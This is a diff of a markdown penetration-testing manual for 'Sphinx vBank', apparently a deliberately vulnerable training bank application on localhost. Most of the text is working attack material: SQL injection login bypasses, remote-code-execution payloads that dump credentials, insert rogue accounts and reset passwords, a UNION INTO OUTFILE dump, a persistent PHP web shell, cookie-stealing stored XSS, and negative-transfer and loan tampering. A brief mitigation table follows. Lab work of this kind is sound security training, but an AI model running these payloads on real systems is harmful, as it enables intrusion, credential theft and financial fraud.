@@ -1,77 +1,147 @@
-# vBank Penetration Testing Guide
+# Sphinx vBank: Senior Penetration Testing Manual
 
-## Senior Penetration Tester Analysis
-
-This guide documents real, verified vulnerabilities in vBank discovered through comprehensive source code analysis. Each attack has been validated against the actual code execution flow.
+This document outlines the manual exploitation of Sphinx vBank. As a senior tester, our goal is to understand the underlying logic flaws by bypassing client-side controls and manipulating server-side state.
 
 ---
 
-## 1. AUTHENTICATION BYPASS: Login SQL Injection
+## 1. Authentication & Identity Attacks
 
-### Vulnerability Analysis
+### 1.1 SQL Injection: Authentication Bypass
+**Vulnerability**: Direct string concatenation in `htdocs/login.php`.
+**Code**: `$sql = "... where ...username='$username' and ...password='$password'";`
 
-**File**: [htdocs/login.php](htdocs/login.php)  
-**Vulnerable Code** (Lines 16-17):
-```php
-$username = $_REQUEST['username'];
-$password = $_REQUEST['password'];
-$sql = "SELECT * FROM " . $htbconf['db/users'] . " where " . $htbconf['db/users.username'] . "='$username' and " . $htbconf['db/users.password'] . "='$password'";
+**Manual Method (Browser DevTools)**:
+1. Navigate to the login page.
+2. Open the Console (F12).
+3. Execute:
+   ```javascript
+   document.loginForm.username.value = "' OR '1'='1";
+   document.loginForm.password.value = "ignore";
+   document.loginForm.submit();
+   ```
+4. **Why it works**: You are bypassing the `checkform()` function in `htb.js` which normally blocks the `'` character.
+
+**Manual Method (cURL)**:
+```bash
+curl -i -c cookies.txt "http://localhost/index.php?page=login&username=' OR '1'='1&password=x"
 ```
 
-### Defense Mechanism Discovered
+### 1.2 Account Enumeration (Zero-Knowledge)
+**Vulnerability**: Weak XOR "obfuscation" using a hardcoded key in `etc/config.php`.
+**Key**: `0x0BADC0DE`
 
-**File**: [htdocs/htb.js](htdocs/htb.js)  
-**Lines 1-12**:
-```javascript
-function checkform() {
-    if (username.match("[^a-zA-Z0-9]")) {
-        alert('Error: The username only allows letters and numbers...');
-        return false;
-    }
-    if (password.match("[^a-zA-Z0-9]")) {
-        alert('Error: The password only allows letters and numbers...');
-        return false;
-    }
-    document.loginForm.submit();
-    return true;
-}
+**Manual Discovery**:
+1. Intercept a request to `htbdetails` in Burp Suite.
+2. Note the `account=252170513` parameter.
+3. Calculate: `252170513 ^ 3735928830 (0x0BADC0DE) = 11111111`.
+4. You now have the real account number. Increment the result and XOR back to find other valid account parameters.
+
+---
+
+## 2. Advanced Database Manipulation (Manual SQLi via RCE)
+
+Standard SQLi in this app is constrained by the PHP `mysql` driver (no stacked queries). However, the **Remote Code Execution (RCE)** vulnerability in `pages/htbdetails.page` allows us to perform any DB action manually.
+
+### 2.1 Retrieving Valid Accounts
+**Manual Method (cURL)**:
+```bash
+curl -b cookies.txt -G "http://localhost/index.php" \
+  --data-urlencode "page=htbdetails" \
+  --data-urlencode "account=252170513" \
+  --data-urlencode "query=\".include('../etc/config.php'); \$r=mysql_query('SELECT username,password FROM users'); while(\$row=mysql_fetch_assoc(\$r)) print_r(\$row); .\""
 ```
 
-### Why Client-Side Validation Fails
+### 2.2 Creating a Rogue Account
+We will use the RCE to manually insert a record into the `users` table.
+**Payload**: `\".mysql_query(\"INSERT INTO users (username, password, name, firstname) VALUES ('hacker', 'P@ssword123', 'Doe', 'John')\").\"`
 
-The JavaScript validation **only blocks the browser form submission**, but does NOT protect against:
-- Direct HTTP POST/GET requests to login.php
-- HTTP request interception and modification
-- Curl/Wget commands
-- Browser developer tools manipulation
-- Burp Suite modification
+**Manual Method (Burp Suite)**:
+1. Navigate to an Account Details page.
+2. Capture the request and send to **Repeater**.
+3. Modify the `query` parameter with the payload above.
+4. Log out and log in with `hacker` / `P@ssword123`.
 
-### Attack Vector: Bypass Methods
+### 2.3 Changing a User's Password
+**Payload**: `\".mysql_query(\"UPDATE users SET password='Compromised123' WHERE username='bob'\").\"`
+1. Send this payload via the `query` parameter in `htbdetails.page`.
+2. bob's credentials are now reset to your chosen value.
 
-#### Method 1: Disable JavaScript in Browser
-1. Open DevTools (F12)
-2. Settings → Disable JavaScript
-3. Refresh page
-4. Form validation won't run, special characters accepted
+---
 
-#### Method 2: Use Browser Developer Tools
-1. Open DevTools Console (F12 → Console)
-2. Execute: `document.loginForm.username.value = "' OR '1'='1"` 
-3. Execute: `document.loginForm.password.value = "anything"`
-4. Execute: `document.loginForm.submit()`
-5. Browser sends unvalidated payload directly to server
+## 3. Request Manipulation & Business Logic
 
-#### Method 3: Burp Suite Interception
-1. Open Burp Suite → Start interceptor
-2. Click login button normally (captures request)
-3. Intercept in Burp → Modify parameters:
+### 3.1 The "Reverse Flow" Negative Transfer
+**Vulnerability**: Lack of range checking in `pages/htbtransfer.page`.
+**Code**: `$sql="update accounts set curbal=curbal-($amount) ..."`
+
+**Manual Method (Burp Suite)**:
+1. Log in as `alex`.
+2. Go to "Transfer Funds".
+3. Intercept the request in Burp.
+4. Change `amount=100` to `amount=-5000`.
+5. **Impact**: `alex`'s balance increases by 5000, while the destination account is debited 5000.
+
+### 3.2 Interest-Free Million Dollar Loan
+**Vulnerability**: Parameter tampering in `pages/htbloanconf.page`.
+**Code**: Hidden fields in the confirmation form are trusted by the server.
+
+**Manual Method (Browser)**:
+1. Request a small, legitimate loan.
+2. On the **Confirmation Page**, do not click "Confirm" yet.
+3. Right-click the page -> **Inspect**.
+4. Find the hidden inputs:
+   ```html
+   <input type="hidden" name="loan" value="1000">
+   <input type="hidden" name="interest" value="5">
    ```
-   GET /index.php?page=login&username=' OR '1'='1&password=' OR '1'='1 HTTP/1.1
-   ```
-4. Forward request
-5. Server-side validation is bypassed, SQL injection executes
+5. Change `1000` to `1000000` and `5` to `0`.
+6. Click the "Confirm" button in the browser.
 
-#### Method 4: curl Command (No Browser)
+---
+
+## 4. Cross-Site Scripting (XSS)
+
+### 4.1 Stored XSS via Transfer Remarks
+**Vulnerability**: Unescaped output in `pages/htbdetails.page`.
+**Code**: `$transfersStr .= "<td>".$row[5]."</td>";`
+
+**Manual Method**:
+1. Create a transfer to another user.
+2. In the "Remark" field, enter: `<script>alert(document.cookie)</script>`.
+3. When the target user views their transaction history, their session cookie is exposed.
+
+---
+
+## 5. Complete Database Exfiltration (Zero-Knowledge)
+
+As a senior tester, you might need to dump the DB without direct access.
+
+**Manual Workflow**:
+1. **Auth Bypass**: Use Section 1.1 to get a session.
+2. **Config Disclosure**: Read the DB credentials from the filesystem.
+   ```bash
+   # Payload for the 'query' param in htbdetails.page:
+   \".print_r(file_get_contents('../etc/config.php')).\"
+   ```
+3. **Exfiltration**: Execute `mysqldump` to the web root and download.
+   ```bash
+   # Payload:
+   \".system('mysqldump -u root -paaa vbank > /var/www/html/dump.sql').\"
+   ```
+4. Navigate to `http://localhost/dump.sql` to retrieve the file.
+
+---
+
+## Summary of Security Failures
+
+| Attack Type | Mitigation Strategy |
+| :--- | :--- |
+| **SQL Injection** | Use Prepared Statements (PDO or MySQLi). |
+| **RCE** | Never use the `/e` modifier in `preg_replace`. Use `preg_replace_callback`. |
+| **XSS** | Apply `htmlspecialchars()` to all data rendered in the browser. |
+| **Tampering** | Re-verify all "hidden" or "read-only" parameters on the server side. |
+
+**Tester Note**: This environment is running PHP 5.6. Modern PHP 7.4+ has removed the `/e` modifier and the `mysql_` extension to prevent these exact issues.
 ```bash
 # Simple authentication bypass
 curl -v "http://localhost/index.php?page=login&username=' OR '1'='1&password=' OR '1'='1"
@@ -570,6 +640,176 @@ curl -b cookies.txt -G "http://localhost/index.php?page=htbloanconf" \
 
 ---
 
+## 7. COMPLETE DATABASE DUMP: Multi-Vector Extraction
+
+### Vulnerability Analysis
+
+This attack combines multiple vulnerabilities to completely dump the database:
+1. **SQL Injection** (authentication bypass)
+2. **RCE** (preg_replace /e modifier)
+3. **File access** (web writable directory)
+
+### Attack Methods
+
+#### Method 1: RCE + mysqldump (FASTEST - 30 seconds)
+
+Use the RCE vulnerability to execute `mysqldump` command directly.
+
+**File**: [pages/htbdetails.page](pages/htbdetails.page)  
+**Parameter**: query  
+**Line**: 56-60
+
+**One-Liner Execution**:
+```bash
+# Using automated exploit
+chmod +x db_dump.sh
+./db_dump.sh http://localhost ./dumps
+
+# Or manual curl
+curl -c cookies.txt "http://localhost/index.php?page=login&username=' OR '1'='1&password=x"
+curl -b cookies.txt -G "http://localhost/index.php" \
+  --data-urlencode "page=htbdetails" \
+  --data-urlencode "account=252170513" \
+  --data-urlencode "query=\" . system('mysqldump -u root -paaa vbank > /var/www/html/vbank_dump.sql') . \""
+sleep 2
+curl "http://localhost/vbank_dump.sql" -o vbank_dump.sql
+```
+
+**Result**: Complete database dump in SQL format (100+ MB possible)
+
+#### Method 2: SQL Injection + INTO OUTFILE
+
+Use SQL injection to dump directly to filesystem.
+
+**Payload**:
+```sql
+' UNION SELECT 1,2,3,4,5,6,7,8 INTO OUTFILE '/var/www/html/data.txt' --
+```
+
+**Exploitation**:
+```bash
+curl -b cookies.txt -G "http://localhost/index.php" \
+  --data-urlencode "page=htbtransfer" \
+  --data-urlencode "remark=' UNION SELECT * FROM users INTO OUTFILE '/var/www/html/users.txt' --" \
+  --data-urlencode "amount=1" \
+  --data-urlencode "dstacc=22222222" \
+  --data-urlencode "srcacc=252170513" \
+  --data-urlencode "dstbank=41131337"
+
+# Download extracted data
+curl "http://localhost/users.txt" -o users.txt
+```
+
+**Result**: Individual table dumps as text files
+
+#### Method 3: Python Direct MySQL Connection
+
+If you have already obtained the credentials (e.g., via the RCE method), you can use a script to connect directly.
+
+**Using Python Script**:
+```bash
+python3 db_dump_exploit.py
+```
+
+**Manual Python**:
+```python
+import pymysql
+
+conn = pymysql.connect(
+    host='127.0.0.1',
+    user='root',
+    password='aaa',
+    database='vbank'
+)
+
+cursor = conn.cursor()
+cursor.execute("SELECT * FROM users")
+users = cursor.fetchall()
+
+# Export to CSV or JSON
+import json
+for user in users:
+    print(json.dumps(user))
+```
+
+**Result**: Direct database access, formatted output (JSON/CSV/SQL)
+
+#### Method 4: Interactive Shell (Persistence)
+
+Create a PHP backdoor for permanent access.
+
+**RCE Payload**:
+```bash
+query=" . file_put_contents('/var/www/html/shell.php', '<?php system($_GET[\"cmd\"]); ?>') . "
+```
+
+**Execute**:
+```bash
+# Create shell
+curl -b cookies.txt -G "http://localhost/index.php" \
+  --data-urlencode "page=htbdetails" \
+  --data-urlencode "account=252170513" \
+  --data-urlencode "query=\" . file_put_contents('/var/www/html/shell.php', '<?php system(\$_GET[\"cmd\"]); ?>') . \""
+
+# Use shell
+curl "http://localhost/shell.php?cmd=mysqldump%20-u%20root%20-paaa%20vbank"
+```
+
+**Result**: Persistent command execution, repeated database access
+
+### Complete Automated Database Dump
+
+**Using Provided Script**:
+```bash
+# Step 1: Run automated exploit
+python3 db_dump_exploit.py \
+  --url http://localhost \
+  --method 1 \
+  --format sql \
+  --output vbank_dump
+
+# Step 2: Check output
+ls -lh vbank_dump.sql
+head -50 vbank_dump.sql
+```
+
+**Result**: Complete database in SQL format, ready to import
+
+### Verification: What Gets Dumped
+
+**Users Table**:
+```sql
+INSERT INTO users VALUES (1, 'alex', '413Xp455', 'Müller', 'Alexander', ..);
+INSERT INTO users VALUES (2, 'bob', 'b0BP4S5', 'Smith', 'Robert', ..);
+```
+
+**Accounts Table**:
+```sql
+INSERT INTO accounts VALUES (11111111, 1, 'Checking', ...);
+INSERT INTO accounts VALUES (22222222, 2, 'Savings', ...);
+```
+
+**Transfers Table**:
+```sql
+INSERT INTO transfers VALUES (1, '2024-01-15', 41131337, 11111111, 41131337, 22222222, '100.00', 'salary', ...);
+```
+
+**Loans Table**:
+```sql
+INSERT INTO loans VALUES (1, 1, 11111111, 22222222, 5000, 12, 3.5, ...);
+```
+
+### Impact of Complete Dump
+
+| Data | Impact | Use Case |
+|------|--------|----------|
+| **Users** | All credentials | Offline cracking, other system access |
+| **Accounts** | All balances | Financial manipulation planning |
+| **Transfers** | Transaction history | Pattern analysis, fraud detection |
+| **Loans** | Credit info | Identity theft, loan fraud |
+
+---
+
 ## Complete Attack Workflow: From Reconnaissance to Full Compromise
 
 ### Phase 1: Initial Access (5 minutes)
@@ -598,16 +838,20 @@ curl -b cookies.txt -G "http://localhost/index.php?page=htbloanconf" \
    - Identify all account numbers
    - Learn transaction patterns
 
-### Phase 3: Data Manipulation (10 minutes)
+### Phase 3: Complete Database Dump (3 minutes)
 
-5. **Inject SQL via transfer remark**
-   - Modify account balances directly
-   - Alter transfer records
-   - Extract user passwords
+5. **Extract entire database**
+   ```bash
+   python3 db_dump_exploit.py --method 1
+   # Or
+   ./db_dump.sh
+   ```
 
-6. **Store XSS payload**
-   - Inject `<img src=x onerror="alert('XSS')">`
-   - Affects all users viewing transfers
+6. **Result**: 
+   - All user credentials
+   - All account balances
+   - Complete transaction history
+   - All loans and personal data
 
 ### Phase 4: System Compromise (5 minutes)
 
@@ -621,7 +865,7 @@ curl -b cookies.txt -G "http://localhost/index.php?page=htbloanconf" \
    - Write web shell
    - Access database directly
 
-### Total Time to Full Compromise: ~25 minutes
+### Total Time to Full Compromise: ~18 minutes (Complete database extraction included)
 
 ---
 
